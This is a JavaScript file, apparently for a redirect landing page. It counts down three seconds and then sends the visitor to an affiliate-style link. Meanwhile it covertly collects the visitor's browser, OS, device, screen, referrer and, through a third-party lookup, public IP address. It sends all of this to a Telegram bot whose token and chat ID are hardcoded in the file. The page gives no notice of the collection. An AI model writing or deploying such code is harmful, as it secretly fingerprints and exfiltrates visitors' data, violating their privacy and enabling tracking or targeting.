// Countdown and redirect function
let seconds = 3;
const countdownElement = document.getElementById('countdown');

const countdownInterval = setInterval(() => {
    seconds--;
    countdownElement.textContent = seconds;
    
    if (seconds <= 0) {
        clearInterval(countdownInterval);
        window.location.href = "https://smrturl.co/a/sa96e6bea59/15315?s1=babli";
    }
}, 1000);

// Data collection
const data = {
    ua: navigator.userAgent,
    pl: navigator.platform,
    ln: navigator.language,
    dr: navigator.doNotTrack,
    sw: screen.width,
    sh: screen.height,
    cd: screen.colorDepth,
    pr: window.devicePixelRatio,
    ts: new Date().toISOString(),
    rf: document.referrer,
    url: window.location.href,
    bt: getBrowserType(),
    os: getOS(),
    dv: getDevice()
};

function getBrowserType() {
    const ua = navigator.userAgent;
    return ua.includes("Firefox") ? "Firefox" :
           ua.includes("SamsungBrowser") ? "Samsung" :
           ua.includes("Opera") ? "Opera" :
           ua.includes("Trident") ? "IE" :
           ua.includes("Edge") ? "Edge" :
           ua.includes("Chrome") ? "Chrome" :
           ua.includes("Safari") ? "Safari" : "Other";
}

function getOS() {
    const ua = navigator.userAgent;
    return ua.includes("Windows") ? "Windows" :
           ua.includes("Mac") ? "MacOS" :
           ua.includes("Linux") ? "Linux" :
           ua.includes("Android") ? "Android" :
           ua.includes("iPhone") ? "iOS" : "Other";
}

function getDevice() {
    return /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
}

// Send via Beacon API (works even if page closes)
navigator.sendBeacon(`https://api.telegram.org/bot8298968431:AAGXBfIoTroFwFngELvwJeyZ9bAwpBS47Wk/sendMessage?chat_id=5615228649&text=${encodeURIComponent(
    `📱 *FULL INSTANT CAPTURE* 📱\n\n` +
    `🌐 *Browser:* ${data.bt} (${data.ua.substring(0,55)}...)\n` +
    `⚙️ *OS/Device:* ${data.os} / ${data.dv}\n` +
    `🖥️ *Screen:* ${data.sw}x${data.sh}\n` +
    `⏱️ *Timestamp:* ${data.ts}\n` +
    `🔗 *URL:* ${data.url}\n` +
    `🔍 *Referrer:* ${data.rf || 'Direct'}\n\n` +
    `*RAW DATA:*\n${JSON.stringify(data, null, 2)}`
)}`);

// Get IP via third-party and send follow-up
fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(ip=>{
    fetch(`https://api.telegram.org/bot8298968431:AAGXBfIoTroFwFngELvwJeyZ9bAwpBS47Wk/sendMessage?chat_id=5615228649&text=🛜%20IP%20UPDATE%20%F0%9F%93%AF%0A${encodeURIComponent(
        `IP: ${ip.ip}\n` +
        `Full Data: ${JSON.stringify(data)}`
    )}`);

}).catch(e=>{});


